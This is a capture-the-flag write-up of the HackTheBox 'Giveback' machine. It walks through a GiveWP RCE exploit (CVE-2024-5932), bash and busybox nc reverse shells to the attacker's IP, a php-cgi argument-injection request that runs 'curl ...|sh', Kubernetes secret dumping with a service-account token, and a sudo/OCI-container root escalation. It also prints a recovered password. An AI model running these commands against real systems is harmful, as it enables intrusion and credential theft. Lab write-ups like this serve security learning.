---
layout: post
title: "[HTB] Giveback"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---

![](/img/htb_img/Giveback_img/img1.png)

- OS: Linux
- Release Date: 01 Nov 2025
- Difficulty: Medium

<br>


# Enumeration

## Nmap recon
```
❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 18:56 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.048s latency).
Not shown: 65106 closed tcp ports (reset), 426 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
30686/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds
```

Scripts and versions.
```
❯ nmap -p22,80,30686 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 18:57 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.047s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp    open  http    nginx 1.28.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-generator: WordPress 6.8.1
|_http-server-header: nginx/1.28.0
30686/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Thu, 06 Nov 2025 17:58:20 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|     "serviceProxyHealthy": true
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Thu, 06 Nov 2025 17:58:05 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|_    "serviceProxyHealthy": true
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30686-TCP:V=7.95%I=7%D=11/6%Time=690CE1A9%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Bal
SF:ancing-Endpoint-Weight:\x201\r\nDate:\x20Thu,\x2006\x20Nov\x202025\x201
SF:7:58:05\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\
SF:n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-servic
SF:e\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20t
SF:rue\n}")%r(HTTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balanc
SF:ing-Endpoint-Weight:\x201\r\nDate:\x20Thu,\x2006\x20Nov\x202025\x2017:5
SF:8:05\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t
SF:\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"
SF:\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true
SF:\n}")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,132,"
SF:HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/json\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Load-Balancing-Endpoint-Weight:\x201\r\
SF:nDate:\x20Thu,\x2006\x20Nov\x202025\x2017:58:20\x20GMT\r\nContent-Lengt
SF:h:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t\t\"namespace\":\x20\"defaul
SF:t\",\n\t\t\"name\":\x20\"wp-nginx-service\"\n\t},\n\t\"localEndpoints\"
SF::\x201,\n\t\"serviceProxyHealthy\":\x20true\n}")%r(LPDString,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.60 seconds
```

## TCP 80: HTTP nginx
![](/img/htb_img/Giveback_img/img2.png)

We can take a look at the blog entry `It's the beginning of a new chapter`.
![](/img/htb_img/Giveback_img/img3.png)

We got a link to the `portal` of the donations.
![](/img/htb_img/Giveback_img/img4.png)

Under this information we can see a `Test Donation`, which says `GiveWP`:
![](/img/htb_img/Giveback_img/img5.png)

For this platform, I found CVE-2024-5932:
https://nvd.nist.gov/vuln/detail/cve-2024-5932

And this exploit:
https://github.com/EQSTLab/CVE-2024-5932

# Foothold
Cloning this repo:
```
❯ git clone https://github.com/EQSTLab/CVE-2024-5932.git
Cloning into 'CVE-2024-5932'...
remote: Enumerating objects: 19, done.
remote: Counting objects: 100% (19/19), done.
remote: Compressing objects: 100% (18/18), done.
remote: Total 19 (delta 9), reused 5 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (19/19), 11.04 KiB | 289.00 KiB/s, done.
Resolving deltas: 100% (9/9), done.

❯ cd CVE-2024-5932

❯ ls -l
.rw-rw-r-- kali kali 9.4 KB Thu Nov  6 19:19:37 2025  CVE-2024-5932-rce.py
.rw-rw-r-- kali kali 9.0 KB Thu Nov  6 19:19:37 2025  CVE-2024-5932.py
.rw-rw-r-- kali kali 1.0 KB Thu Nov  6 19:19:37 2025  PoC.php
.rw-rw-r-- kali kali 8.2 KB Thu Nov  6 19:19:37 2025  README.md
.rw-rw-r-- kali kali  88 B  Thu Nov  6 19:19:37 2025 󰌠 requirements.txt
```

```
❯ python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'"
```

And on our machine:
```
❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from beta-vino-wp-wordpress-5c5bf47f4-8t7j8~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.xx.xx:4444
[+] Got reverse shell from beta-vino-wp-wordpress-5c5bf47f4-8t7j8~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/beta-vino-wp-wordpress-5c5bf47f4-8t7j8~10.129.xx.xx-Linux-x86_64/2025_11_06-19_22_59-517.log 📜
─────────────────────────────────────────────────────────────────
id
uid=1001 gid=0(root) groups=0(root),1001
I have no name!@beta-vino-wp-wordpress-5c5bf47f4-8t7j8:/opt/bitnami/wordpress/wp-admin$
```

This is a very limited shell, so let's use a trick with php-cgi from our own machine.
On our attacker machine, we create a file with a reverse shell command:
```
❯ cat bomb
───────┬────────────────────────────────────────────
       │ File: bomb
───────┼────────────────────────────────────────────
   1   │ busybox nc 10.10.xx.xx 4040 -e /bin/sh
───────┴────────────────────────────────────────────
```

Doing a bit of enumeration we can get the network:
```
I have no name!@beta-vino-wp-wordpress-5c5bf47f4-8t7j8:/opt/bitnami/wordpress/wp-admin$ cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/1 2 0 2
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        +-- 10.42.0.0/23 3 1 5
           |-- 10.42.0.0
              /16 universe UNICAST
           |-- 10.42.1.0
              /24 link UNICAST
           +-- 10.42.1.192/26 2 0 2
              |-- 10.42.1.198
                 /32 host LOCAL
              |-- 10.42.1.255
                 /32 link BROADCAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/1 2 0 2
     +-- 0.0.0.0/4 2 0 2
        |-- 0.0.0.0
           /0 universe UNICAST
        +-- 10.42.0.0/23 3 1 5
           |-- 10.42.0.0
              /16 universe UNICAST
           |-- 10.42.1.0
              /24 link UNICAST
           +-- 10.42.1.192/26 2 0 2
              |-- 10.42.1.198
                 /32 host LOCAL
              |-- 10.42.1.255
                 /32 link BROADCAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
```

## Getting a better shell
After looking around a bit, from the attacker machine:
```
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'curl 10.10.xx.xx:8000/bomb|sh']]); echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
```

Opening another session of penelope:
```
❯ penelope -p 4040
[+] Listening for reverse shells on 0.0.0.0:4040 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-zcx88~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.xx.xx:4040
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-zcx88~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/legacy-intranet-cms-6f7bf5db84-zcx88~10.129.xx.xx-Linux-x86_64/2025_11_06-19_51_50-275.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[-] Spawn MANUALLY a new shell for this session to operate properly
/var/www/html/cgi-bin # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/var/www/html/cgi-bin # 
```

## Getting masterpassword
Using curl we can get the endpoint: https://kubernetes.default.svc/api/v1/namespaces/default/secrets
At the end we get a base64-encoded master password. Decoding it gives us the plaintext:
```
/var/www/html/cgi-bin # curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets

<...>
      },
      "data": {
        "MASTERPASS": "Z3huWjF6NUhyR2ZkV0tNcGlhMDVlYXE1YVJCRVBvaA=="
      },
      "type": "Opaque"
    }
  ]
/var/www/html/cgi-bin # 
```

```
❯ echo Z3huWjF6NUhyR2ZkV0tNc | base64 -d
gxnZ1z5HrGfdWKMpia05eaq5aRBEPoh
```

## Shell as babywyrm
```
❯ ssh babywyrm@giveback.htb
babywyrm@giveback.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Nov 6 19:02:27 2025 from 10.10.xx.xx
babywyrm@giveback:~$
```

Correct!

### User flag
```
babywyrm@giveback:~$ cat user.txt 
<REDACTED>
babywyrm@giveback:~$
```

# Privilege Escalation
Running the sudo permission check:
```
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
babywyrm@giveback:~$
```

Let's create the directory for the rootfs and a fake config file:
```
babywyrm@giveback:~/privesc$ ls
config.json  rootfs
babywyrm@giveback:~/privesc$ cat config.json 
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/cat", "/root/root.txt"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/dev", "type": "tmpfs", "source": "tmpfs", "options": ["nosuid","strictatime","mode=755","size=65536k"]},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","ro"]},
    {"destination": "/usr", "type": "bind", "source": "/usr", "options": ["bind","ro"]}
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "network"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"}
    ]
  }
}
babywyrm@giveback:~/privesc$
```

And if we run the command:
```
babywyrm@giveback:~/privesc$ sudo /opt/debug run getflag                                                          
Validating sudo...
Please enter the administrative password: 
```

## Going back for the admin password
We see that it asks for an admin password, which is different from the user's.
Going back to the Kubernetes secrets, we can find it stored as `mariadb-password`.

```
<...>
        ]          
      },                               
      "data": {                
        "mariadb-password": "c1c1c3A0c3...",
        "mariadb-root-password": "c1c1c3..."
      },                                            
      "type": "Opaque"
    },                                                 
    {                                            
      "metadata": {                           
        "name": "beta-vino-
<...>
```

### Root flag
So, running again the program:
```
babywyrm@giveback:~/privesc$ sudo /opt/debug run getflag                                                          
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
<REDACTED>
```